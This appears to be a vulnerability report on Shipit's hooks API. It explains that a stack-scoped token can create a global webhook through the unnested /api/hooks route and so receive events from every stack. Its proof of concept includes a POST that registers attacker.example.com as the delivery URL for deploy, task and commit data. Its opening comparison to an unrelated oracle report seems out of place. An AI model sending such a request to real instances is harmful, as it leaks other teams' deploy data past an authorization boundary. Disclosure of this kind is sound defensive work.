### Title
Stack-scoped API token can create a global webhook that leaks deploy/task/commit data for every stack - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
The bug-class in the reference report is a validation gap that applies only on one code path (Chainlink used *while Tellor works*) but is silently skipped on a structurally identical path (Chainlink used *while Tellor is untrusted*), letting an attacker exploit the unguarded path. The same "guarded on one route, unguarded on the sibling route" pattern exists in Shipit's `Api::HooksController`: the scope check that binds an `ApiClient` to the single `Stack` it was authorized for is only applied on the *nested* `/api/stacks/:stack_id/hooks` route, and is completely skipped on the sibling *global* `/api/hooks` route, even though both routes are reachable with the very same `write:hook`-permissioned, stack-scoped token.

### Finding Description
`ApiClient` can be scoped to a single stack via `belongs_to :stack, optional: true` [1](#0-0) . `Api::BaseController#stacks` is supposed to enforce that binding for every stack lookup:
```
current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
``` [2](#0-1) 

`Api::HooksController`, however, computes the hooks scope independently, without going through this stack-restricted lookup unless a `stack_id` route parameter happens to be present:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

`config/routes.rb` mounts this controller twice: once nested under a stack (`params[:stack_id]` present, correctly scoped) and once as a completely global collection with no stack parameter at all:
```ruby
scope '/stacks/*stack_id', ... do
  ...
  resources :hooks, only: %i[index create show update destroy]
end

resources :hooks, only: %i[index create show update destroy]
``` [4](#0-3) 

On the global route, `params[:stack_id]` is absent, so `stack_id` returns `nil` without ever calling `stack` (which is the method that enforces `current_api_client`'s stack binding). This means `hooks` becomes `Hook.where(stack_id: nil)`, i.e. Shipit's "global hook" scope [5](#0-4) . Global hooks receive events for **every** stack:
```ruby
def deliver(event, stack_id, payload)
  for_stack(stack_id).listening_event(event).each { |hook| hook.deliver!(event, payload) }
end
def for_stack(stack_id)
  where(stack_id: [nil, stack_id])
end
``` [6](#0-5) [7](#0-6) 

Authorization for the `create` action only checks the permission string, never the stack binding:
```ruby
require_permission :write, :hook, only: %i[create update destroy]
...
def check_permissions!(operation, scope)
  required_permission = "#{operation}:#{scope}"
  raise InsufficientPermission unless permissions.include?(required_permission)
end
``` [8](#0-7) [9](#0-8) 

**The broken equality:** the stack a token is authorized for (`current_api_client.stack_id`) must equal the set of stacks whose events the token can subscribe to via a hook it creates. Before the attacker's request, that equality holds only accidentally (nobody exercises the global endpoint with a scoped token). After a `POST /api/hooks` call with a stack-scoped, `write:hook`-permissioned token, the token now receives `deploy`, `task`, `rollback`, `commit_status`, `merge`, `pull_request`, `lock`, `deployable_status`, `merge_status`, `stack`, and `review_stack` events (including commit SHAs, deploy status/output URLs, environment/lock info) for **every stack in the Shipit instance**, not just the one it was scoped to.

### Impact Explanation
This lets an `ApiClient` token that an operator intentionally restricted to a single stack (`stack_id` set, e.g. to avoid it seeing other teams' deploys) instead register a delivery URL that receives event payloads — including deploy state, task output links (`SHIPIT_LINK`), commit SHAs, and merge/lock activity — for all stacks across the whole application. This matches the in-scope High-impact category "unauthenticated read of stack state, task streams or deploy output," achieved here by an authenticated-but-scope-limited token escalating past its intended stack boundary, an authorization/credential-scope binding break rather than a legitimate feature.

### Likelihood Explanation
Any holder of a stack-scoped `ApiClient` token with `write:hook` permission (a routine permission an operator might grant for a team to manage their own stack's outgoing webhooks) can trigger this with a single unauthenticated-beyond-the-token API call; no race condition, timing, or privileged access is required, and the vulnerable route (`POST /api/hooks`) is part of the documented, always-mounted routing table.

### Recommendation
In `Api::HooksController`, resolve the hooks scope the same way `Api::BaseController#stacks`/`#stack` does regardless of whether `params[:stack_id]` is present: if `current_api_client.stack_id?` is true, reject (403/`InsufficientPermission`) any attempt to create/read/update/destroy a hook whose `stack_id` isn't `current_api_client.stack_id`, including on the global `/api/hooks` collection. Alternatively, disallow stack-scoped `ApiClient`s from hitting the global hooks endpoint entirely.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack: shipit` with `permissions: ['write:hook']` (analogous to the `here_come_the_walrus` fixture but with `write:hook` added) [10](#0-9) .
2. Using that token's Basic-Auth credentials, call:
```
POST /api/hooks
{ "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","task","commit_status","merge"], "content_type": "json" }
```
   This hits the global route (`resources :hooks` at `config/routes.rb:46`), so `params[:stack_id]` is absent and `HooksController#stack_id` returns `nil` without validating against `current_api_client.stack_id`.
3. `Hook.create(stack_id: nil, ...)` succeeds because the controller and `Hook` validations never compare `stack_id` to the requesting client's authorized stack.
4. From then on, `Hook.deliver` (invoked from `Hook.emit` on every deploy/task/commit-status/merge event across all stacks) matches this hook via `for_stack(stack_id).where(stack_id: [nil, stack_id])` and POSTs the full event payload — for stacks the token was never authorized to touch — to the attacker's `delivery_url`.
